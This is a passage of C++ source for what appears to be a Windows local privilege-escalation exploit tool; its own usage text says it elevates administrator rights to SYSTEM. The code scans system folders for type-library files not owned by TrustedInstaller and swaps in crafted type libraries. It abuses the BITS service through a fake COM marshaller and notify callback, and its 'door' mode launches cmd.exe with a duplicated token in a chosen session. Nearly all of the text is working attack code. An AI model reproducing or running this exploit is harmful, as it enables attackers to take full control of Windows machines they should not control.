	}
	BOOL check_owner(BSTR Path, BSTR extPath, BOOL Deep)
	{

		HRESULT hr = S_OK;
		BSTR lpName = (BSTR)malloc(LEN);
		BSTR lpDomain = (BSTR)malloc(LEN);
		BSTR stringSid = (BSTR)malloc(LEN);
		BSTR TrustedInstallerSid = SysAllocString(L"TrustedInstaller");
		PSID pOwnerSid = NULL;
		DWORD i, dwSize = 0, dwResult = 0;
		PSECURITY_DESCRIPTOR pSD = NULL;
		SID_NAME_USE SidType;
		ITypeLib * ptlib = nullptr;

		BSTR extPathLookUp = PathFindExtensionW(Path);
		if (wcslen(extPath))
		{
			if (_wcsicmp(extPathLookUp, extPath) == 0)
			{
				return FALSE;
			}
		}
		if ((_wcsicmp(extPathLookUp, L".mui") == 0) || (_wcsicmp(extPathLookUp, L".dll") != 0 && _wcsicmp(extPathLookUp, L".tlb") != 0 && _wcsicmp(extPathLookUp, L".olb") != 0 && _wcsicmp(extPathLookUp, L".ocx") != 0))
		{
			return FALSE;
		}
		if (GetNamedSecurityInfoW(Path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION,
			&pOwnerSid, NULL, NULL, NULL, &pSD) == ERROR_SUCCESS) {
			if (pSD != NULL) {

				dwSize = LEN;
				if (LookupAccountSid(NULL, pOwnerSid,
					lpName, &dwSize, lpDomain,
					&dwSize, &SidType))
				{


					if (wcsstr(lpName, TrustedInstallerSid) == NULL)
					{
						if (Deep)
						{
							return CheckTypeLibInfoToExploit(Path, TRUE);
						}
						else{
							hr = LoadTypeLib(Path, &ptlib);
							if (FAILED(hr))
							{
								//printf("[+]LoadTypeLib Failed Result: %08X\n", hr);
								return FALSE;
							}
							else
							{
								if (ptlib)
								{
									hr = ptlib->Release();
									if (FAILED(hr))
									{
										printf("[+]check_owner LoadTypeLib Release Failed Result: %08X\n", hr);
										return FALSE;
									}
								}
								return TRUE;
							}

						}

					}
				}
				else
				{
					printf("[+]LookupAccountSid Error %d\n", GetLastError());
					return FALSE;
				}

			}

		}

		if (pSD)
		{
			LocalFree(pSD);
		}
		return FALSE;
	}

	BOOL  DirectoryList(BSTR Path, BSTR extPath, BOOL Deep)
	{
		if (!PathIsDirectoryW(Path))
		{

			return FALSE;
		}
		WIN32_FIND_DATAW FindData;
		HANDLE hError;

		BSTR FilePathName = (BSTR)malloc(LEN);
		// 构造路径
		bstr_t FullPathName;
		wcscpy(FilePathName, Path);
		wcscat(FilePathName, L"\\*.*");
		hError = FindFirstFile(FilePathName, &FindData);
		if (hError == INVALID_HANDLE_VALUE)
		{
			//printf("[+]Enumerating %ls Failed Try To Skip, code: %d,error: %d\n", FilePathName, GetLastError(), hError);
			return 0;
		}
		while (::FindNextFile(hError, &FindData))
		{
			// 过虑.和..
			if (_wcsicmp(FindData.cFileName, L".") == 0
				|| _wcsicmp(FindData.cFileName, L"..") == 0)
			{
				continue;
			}
			FullPathName = bstr_t(Path) + "\\" + FindData.cFileName;
			// 构造完整路径
			if (check_owner(FullPathName.GetBSTR(), extPath, Deep))
			{
				printf("%ls\n", FullPathName.GetBSTR());
			}
			//wsprintf(FullPathName, L"%s\\%s", Path, FindData.cFileName);
			FileCount++;
			// 输出本级的文件

			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				DirectoryList(FullPathName, extPath, Deep);
			}
		}
		return FALSE;
	}




	BOOL list_vulnerable(BOOL Deep)
	{
		BSTR Path = data->dllPath;
		if (wcslen(Path))
		{

			if (PathIsDirectoryW(Path))
			{

				DirectoryList(Path, data->extPath, Deep);
			}
			else
			{
				printf("[+]Directory: %ls Is Not  Validated ,exit \n", Path);
			}
		}
		else
		{
			DirectoryList(L"C:\\Program Files (x86)", data->extPath, Deep);	
			DirectoryList(L"C:\\Windows\\Microsoft.NET", data->extPath, Deep);
			DirectoryList(L"C:\\Windows\\System32", data->extPath, Deep);
			DirectoryList(L"C:\\Windows\\SysWOW64", data->extPath, Deep);
		}


		return  TRUE;
	}

};





class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknown * _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown * unk) : _ref_count(1)
	{
		_unk = unk;

	}


	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{

		*ppvObject = nullptr;
		//printf("[+]QI [CMarshaller] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		//printf("[+]Queried Success: %p\n", *ppvObject);
		((IUnknown *)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{

		//printf("[+]AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{

		//printf("[+]Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			//printf("[+]Release object %p\n", this);
			delete this;
		}
		return ret;
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{


		GUID CLSID_AggStdMarshal2 = { 0x00000027, 0x0000, 0x0008, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
		*pCid = CLSID_AggStdMarshal2;

		//printf("[+]GetUnmarshalClass: %ls %p\n", IIDToBSTR((REFIID)*pCid).GetBSTR(), this);
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		IStorage* stg;
		ILockBytes* lb;
		CreateILockBytesOnHGlobal(nullptr, TRUE, &lb);
		StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);
		ULONG cbRead;
		ULONG cbWrite;
		IStreamPtr pStream = nullptr;
		HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &pStream);
		LARGE_INTEGER dlibMove = { 0 };
		ULARGE_INTEGER plibNewPosition;
		hr = CoMarshalInterface(pStream, IID_IUnknown, static_cast<IUnknownPtr>(stg), dwDestContext, pvDestContext, mshlflags);
		OBJREF* headerObjRef = (OBJREF*)malloc(1000);
		hr = pStream->Seek(dlibMove, STREAM_SEEK_SET, &plibNewPosition);
		hr = pStream->Read(headerObjRef, 1000, &cbRead);
		printf("[+]MarshalInterface: %ls %p\n", IIDToBSTR(IID_InterfaceTemp).GetBSTR(), this);
		headerObjRef->iid = IID_InterfaceTemp;
		hr = pStm->Write(headerObjRef, cbRead, &cbWrite);
		return hr;

	}


	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};







class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	HANDLE m_ptoken;
	LONG m_lRefCount;

	IUnknown *_umk;
	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject(IUnknown *umk){
		_umk = umk;
		m_lRefCount = 1;

	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{


		//printf("[+]QI [FakeObject] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
		if (riid == __uuidof(IUnknown))
		{
			printf("[+]Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			printf("[+]Query for IBackgroundCopyCallback2\n");

		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			printf("[+]Query for IBackgroundCopyCallback\n");

		}
		else if (riid == __uuidof(IPersist))
		{
			printf("[+]Query for IPersist\n");
			*ppvObj = static_cast<IPersist*>(this);
			//*ppvObj = _unk2;
		}

		else if (riid == IID_IMarshal)
		{
			printf("[+]Query for IID_IMarshal\n");
			//*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);


			*ppvObj = NULL;
			return E_NOINTERFACE;
		}
		else
		{
			printf("[+]Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown *)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
	{
		printf("[+]JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
	{
		printf("[+]JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ DWORD dwReserved)
	{
		printf("[+]JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
	{
		printf("[+]FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		printf("[+]GetClassID\n");


		*pClassID = GUID_NULL;

		return S_OK;
	}
};



_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));

void TestBits(HANDLE hEvent)
{

	IBackgroundCopyManagerPtr pQueueMgr;
	IID CLSID_BackgroundCopyManager;
	IID IID_IBackgroundCopyManager;
	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
	CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);

	HRESULT	hr = CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
		CLSCTX_ALL, IID_IBackgroundCopyManager, (void**)&pQueueMgr);

	IUnknown * pOuter = new CMarshaller(static_cast<IPersist*>(new FakeObject(nullptr)));
	IUnknown * pInner;

	CoGetStdMarshalEx(pOuter, CLSCTX_INPROC_SERVER, &pInner);

	IBackgroundCopyJobPtr pJob;
	GUID guidJob;

	IEnumBackgroundCopyJobsPtr enumjobs;
	hr = pQueueMgr->EnumJobs(0, &enumjobs);
	if (SUCCEEDED(hr))
	{
		IBackgroundCopyJob* currjob;
		ULONG fetched = 0;

		while ((enumjobs->Next(1, &currjob, &fetched) == S_OK) && (fetched == 1))
		{
			LPWSTR lpStr;
			if (SUCCEEDED(currjob->GetDisplayName(&lpStr)))
			{
				if (wcscmp(lpStr, L"BitsAuthSample") == 0)
				{
					CoTaskMemFree(lpStr);
					currjob->Cancel();
					currjob->Release();
					break;
				}
			}
			currjob->Release();
		}
	}


	pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob);



	IUnknownPtr pNotify;


	pNotify.Attach(new CMarshaller(pInner));
	{


		HRESULT hr = pJob->SetNotifyInterface(pNotify);
		printf("[+]Test Background Intelligent Transfer Service Result: %08X\n", hr);

	}
	if (pJob)
	{
		pJob->Cancel();
	}

	//printf("[+]Done\n");
	SetEvent(hEvent);

}



BOOL EnablePrivilege(LPCWSTR PrivilegeName){
	HANDLE hCurrentToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken))
	{
		printf("[info] can not open current process token: %d\n", GetLastError());
		return FALSE;
	}

	TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)malloc(sizeof(TOKEN_PRIVILEGES));
	LUID luid;
	LUID_AND_ATTRIBUTES* plaa = (LUID_AND_ATTRIBUTES*)malloc(sizeof(LUID_AND_ATTRIBUTES));
	PRIVILEGE_SET* pset = (PRIVILEGE_SET*)malloc(sizeof(PRIVILEGE_SET));
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		PrivilegeName,   // privilege to lookup 
		&plaa->Luid))        // receives LUID of privilege
	{
		printf("[info] LookupPrivilegeValue failed: %d\n", GetLastError());
		return FALSE;
	}

	tp->PrivilegeCount = 1;
	plaa->Attributes = SE_PRIVILEGE_ENABLED;
	tp->Privileges[0] = *plaa;
	pset->PrivilegeCount = tp->PrivilegeCount;
	pset->Control = PRIVILEGE_SET_ALL_NECESSARY;
	pset->Privilege[0] = *plaa;

	BOOL b = FALSE;
	if (!AdjustTokenPrivileges(
		hCurrentToken,
		FALSE,
		tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[info] AdjustTokenPrivileges failed: %d\n", GetLastError());
		return FALSE;
	}
	if (!PrivilegeCheck(hCurrentToken, pset, &b))
	{
		printf("[info] PrivilegeCheck failed: %d\n", GetLastError());
		return FALSE;
	}
	if (b)
	{
		printf("[info] PrivilegeCheck %ls Success: %d\n", PrivilegeName, GetLastError());
	}
	return b;
}



void CreateNewProcess(const wchar_t* session)
{

	try
	{
		ShellExecuteW(NULL, NULL, L"C:\\Windows\\System32\\bitsadmin.exe", L"/reset /allusers", NULL, SW_HIDE);
	}
	catch (const _com_error& err)
	{
	}

	

	DWORD session_id = wcstoul(session, nullptr, 0);
	SafeScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SafeScopedHandle new_token;

	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"cmd.exe";
	if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
}





int _tmain(int argc, _TCHAR* argv[])
{
	try
	{

		IID TypeLib_InterfaceTemp;
		ChaHua* exp = nullptr;		
		HRESULT hr = S_OK;
		bool CMD_Mode = false;
		//hr = CoInitialize(NULL);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		wchar_t* argv1 = L"u";
		if (argc < 2)
		{
			printf("[+] This Tool Require Administrator Rights, Elevation Privilege To System\n");			
			printf("[+] List Vulnerable File: exp.exe v [find path] [extension]\n");
			printf("[+] List Vulnerable File Deep Mode: exp.exe d [find path] [extension]\n");
			printf("[+] Test CMD Directly With IID_Interface: exp.exe t \"IID_Interface\" \n");
			printf("[+] Build Script and Run CMD With IID_Interface Auto Mode: exp.exe u \"IID_Interface\" \n");
			printf("[+] Build Script and Run CMD With TypeLib_Path Auto Mode: exp.exe u \"TypeLib_Path\" \n");
			printf("[+] Build Script and Run CMD With Advanced Mode: exp.exe [u] [IID_Interface] [InterfaceName] [TypeLib_GUID_Interface] [TypeLib_Path] [Disable_Redirection]\n");

		}
		else
		{			
			argv1 = argv[1];
		}



		
		//v,d为查找模式
		if (_wcsicmp(argv1, L"v") == 0 | _wcsicmp(argv1, L"d") == 0)
		{
			if (argc > 2)
			{


				if (argc > 3)
				{
					exp = new ChaHua(argv[2], argv[3]);
				}
				else
				{
					exp = new ChaHua(argv[2]);
				}
			}
			else
			{
				exp = new ChaHua();
			}

			exp->list_vulnerable(_wcsicmp(argv1, L"d") == 0);
			return 0;
		}
		if (_wcsicmp(argv1, L"u") == 0 || _wcsicmp(argv1, L"t") == 0)
		{

			//会自动检测不需要		
			
			CLSIDFromString(L"{55E3EA25-55CB-4650-8887-18E8D30BB4BC}", &IID_InterfaceTemp);
			CLSIDFromString(L"{4FB2D46F-EFC8-4643-BCD0-6E5BFA6A174C}", &TypeLib_InterfaceTemp);

			if (_wcsicmp(argv1, L"u") == 0)
			{
				//有IID_InterfaceTemp或路径才判断
				if (argc > 2)
				{
					
					//如花括号guid类型argv2=[TypeLib_Path]
					if (wcschr(argv[2], L'{') == NULL)
					{

						exp = new ChaHua(argv[2]);

						if (!exp->GetTypeLibInfoToExploitWrapper(FALSE))
						{
							printf("[+]Check TypeLib Failed , Invalid  Path \n");
							return 0;
						}

						if (!exp->GetRegTypeInfoOfIIDWrapper(FALSE))
						{
							printf("[+]Check LoadTypeLib Failed \n");
							return 0;
						}
						exp->CheckDllPathCompare(argv[2]);

					}
					else{
						//argv2=[IID_Interface],argv3=[InterfaceName],argv4=[TypeLib_GUID_Interface],argv5=[TypeLib_Path]
						CLSIDFromString(argv[2], &IID_InterfaceTemp);
						if (argc == 3)
						{
							exp = new ChaHua(IID_InterfaceTemp);
							if (!exp->GetRegTypeInfoOfIIDWrapper(FALSE))
							{
								printf("[+]Check LoadTypeLib Failed \n");
								return 0;
							}
						}
						//Advanced Mode
						if (argc > 4)
						{

							CLSIDFromString(argv[4], &TypeLib_InterfaceTemp);

							if (argc > 5)
							{
								exp = new ChaHua(IID_InterfaceTemp, argv[3], TypeLib_InterfaceTemp, argv[5]);
							}
							else{
								exp = new ChaHua(IID_InterfaceTemp, argv[3], TypeLib_InterfaceTemp);
								hr = exp->ReQueryPathOfRegTypeLibWrapper(FALSE);
								if (FAILED(hr))
								{
									printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
									return 0;
								}
							}
						}
						
					}
				}
				else
				{
					exp = new ChaHua(IID_InterfaceTemp);
					if (!exp->GetRegTypeInfoOfIIDWrapper(FALSE))
					{
						printf("[+]Check LoadTypeLib Failed \n");
						return 0;
					}
				}

			}




			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (_wcsicmp(argv1, L"u") == 0)
			{

				exp->BuildTypeLibsWrapper(nullptr);
				if (argc > 6)
				{
					CMD_Mode = true;
				}

				//copy typelib file
				if (exp->ExploitCopyFile(CMD_Mode))
				{
					IID_InterfaceTemp = *(exp->GetFakeIID_IInterface());
					TestBits(hEvent);
					printf("[+]Exploited TypeLib Done,Try To Cleanup \n");
					system("pause");
					exp->RestoreExploitFile(CMD_Mode);				

				}

			}

			//不检测直接执行模式,不做typelib检测
			else if (_wcsicmp(argv1, L"t") == 0)
			{

				if (argc > 2)
				{
					CLSIDFromString(argv[2], &IID_InterfaceTemp);
				}
				TestBits(hEvent);
			}
		}

		if (_wcsicmp(argv1, L"door") == 0)
		{
			CreateNewProcess(argv[2]);
			return 0;
		}


	}
	catch (const _com_error& err)
	{
		printf("[+]Error: %ls\n", err.ErrorMessage());
	}
	CoUninitialize();//释放COM
	return 0;
}
